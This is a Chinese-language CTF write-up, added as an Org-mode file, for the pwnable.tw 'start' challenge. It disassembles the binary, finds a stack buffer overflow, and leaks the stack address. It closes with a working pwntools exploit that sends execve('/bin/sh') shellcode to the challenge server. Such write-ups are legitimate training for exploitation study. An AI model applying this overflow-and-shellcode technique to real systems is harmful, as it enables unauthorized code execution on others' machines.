@@ -1,0 +1,141 @@
+#+TITLE: pwnable.tw 之 start
+** 分析
+运行一下：
+
+#+BEGIN_SRC 
+➜  Desktop ./start 
+Let's start the CTF:123456
+#+END_SRC
+
+输出“Let's start the CTF:”，然后让你输入。
+ltrace一下
+
+#+BEGIN_SRC 
+➜  Desktop ltrace ./start 
+Couldn't find .dynsym or .dynstr in "/proc/5532/exe"
+#+END_SRC
+
+并没有什么卵用。。
+
+#+BEGIN_SRC 
+Symbol table '.symtab' contains 8 entries:
+   Num:    Value  Size Type    Bind   Vis      Ndx Name
+     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
+     1: 08048060     0 SECTION LOCAL  DEFAULT    1 
+     2: 00000000     0 FILE    LOCAL  DEFAULT  ABS start.s
+     3: 0804809d     0 NOTYPE  LOCAL  DEFAULT    1 _exit
+     4: 08048060     0 NOTYPE  GLOBAL DEFAULT    1 _start
+     5: 080490a3     0 NOTYPE  GLOBAL DEFAULT    1 __bss_start
+     6: 080490a3     0 NOTYPE  GLOBAL DEFAULT    1 _edata
+     7: 080490a4     0 NOTYPE  GLOBAL DEFAULT    1 _end
+#+END_SRC
+
+连main都没有。。看来貌似是汇编写的。。丢r2里看一下
+
+#+BEGIN_SRC assembly
+   ;      [0] va=0x08048060 pa=0x00000060 sz=67 vsz=67 rwx=-r-x .text
+            ;-- section..text:
+            0x08048060    54           push esp
+            0x08048061    689d800408   push sym._exit ; 0x0804809d 
+            0x08048066    31c0         xor eax, eax
+            0x08048068    31db         xor ebx, ebx
+            0x0804806a    31c9         xor ecx, ecx
+            0x0804806c    31d2         xor edx, edx
+            0x0804806e    684354463a   push 0x3a465443 ; 0x3a465443 
+            0x08048073    6874686520   push 0x20656874 ; 0x20656874 
+            0x08048078    6861727420   push 0x20747261 ; 0x20747261 
+            0x0804807d    6873207374   push 0x74732073 ; 0x74732073 
+            0x08048082    684c657427   push 0x2774654c ; 0x2774654c 
+            0x08048087    89e1         mov ecx, esp
+            0x08048089    b214         mov dl, 0x14
+            0x0804808b    b301         mov bl, 0x1
+            0x0804808d    b004         mov al, 0x4
+            0x0804808f    cd80         int 0x80
+               syscall[0xffffffff][0]=? ; sym._end
+            0x08048091    31db         xor ebx, ebx
+            0x08048093    b23c         mov dl, 0x3c
+            0x08048095    b003         mov al, 0x3
+            0x08048097    cd80         int 0x80
+               syscall[0xffffffff][0]=? ; sym._end
+            0x08048099    83c414       add esp, 0x14
+            0x0804809c    c3           ret
+            ;-- sym._exit:
+            0x0804809d    5c           pop esp
+            0x0804809e    31c0         xor eax, eax
+            0x080480a0    40           inc eax
+            0x080480a1    cd80         int 0x80
+               syscall[0xffffffff][0]=? ; sym._end
+#+END_SRC
+
+重点是这里
+#+BEGIN_SRC assembly
+            0x08048087    89e1         mov ecx, esp
+            0x08048089    b214         mov dl, 0x14
+            0x0804808b    b301         mov bl, 0x1
+            0x0804808d    b004         mov al, 0x4
+            0x0804808f    cd80         int 0x80
+               syscall[0xffffffff][0]=? ; sym._end
+            0x08048091    31db         xor ebx, ebx
+            0x08048093    b23c         mov dl, 0x3c
+            0x08048095    b003         mov al, 0x3
+            0x08048097    cd80         int 0x80
+#+END_SRC
+
+它调用了2个系统调用一个是4，一个是3，查了一下4的那个是write，3的那个是read。
+系统调用的参数是依次放在ebx,ecx,edx...中的。也就是说上边2个系统调用用c写就是这样
+
+#+BEGIN_SRC c
+write(1,$esp,0x14);
+read(0,$esp,0x3c);
+#+END_SRC
+
+那么很明显存在溢出。
+用gdb调试下
+[[./img/start1.png]]
+可以看到在此时栈内就是输入的那段话。
+然后会使用write系统调用输出它。
+[[./img/start2.png]]
+接下来会调用read从标准输入里读0x3c字节到栈里。
+我们用pwn cyclic 生成60字节的数据读到栈里。
+发现原来的已经被我们的数据覆盖了。
+[[./img/start3.png]]
+[[./img/start4.png]]
+接下来就会报错。是在offset为20的地方。
+[[./img/start5.png]]
+然后发现原来那个 0x804809d 竟然是返回地址 Σ(っ °Д °;)っ。
+所以我就想能不把eip劫持到栈上去执行我们的shellcode。。但是checksec看一下，是开了NX的。。
+但是汇编写的还是静态编译。ret2libc不行rop链也找不到。。
+然后我就不会了。。
+网上查了下。。虽然开了NX但是栈上是可执行的 ∑(°Д°≡°Д°)。
+那么就简单了。我们可以通过在 0x08048087 上的~mov ecx esp~,把esp的地址leak出来。
+因为当你ret到0x08048087时，esp上前4个字节就是_start()一开始push进去的esp。
+然后程序会再次执行~write(1,esp,0x14)~前4个字节就是我们需要的esp的地址。
+我们再让read读'a'*20+esp_addr-20+shellcode到esp处就能执行我们的shellcode。
+然后我发现貌似pwntools的shellcode不能用。。不知道为什么。那么只能自己写了。
+** exp
+#+BEGIN_SRC python
+
+from  pwn import *
+context.binary='./start'
+shellcode = asm(
+    '''
+xor ecx,ecx
+xor edx,edx
+push ecx
+push 0x68732f2f
+push 0x6e69622f
+mov ebx,esp
+mov al,0xb
+int 0x80
+    '''
+)
+r = remote('chall.pwnable.tw',10000)
+r.recv()
+r.send('A'*20+'\x87\x80\x04\x08')
+esp_addr = u32(r.recv(4))
+print "esp_addr is :",hex(esp_addr)
+#r.recv()
+r.send('A'*20 + p32(esp_addr+20) + shellcode)#asm(shellcraft.sh())
+r.interactive()
+
+#+END_SRC
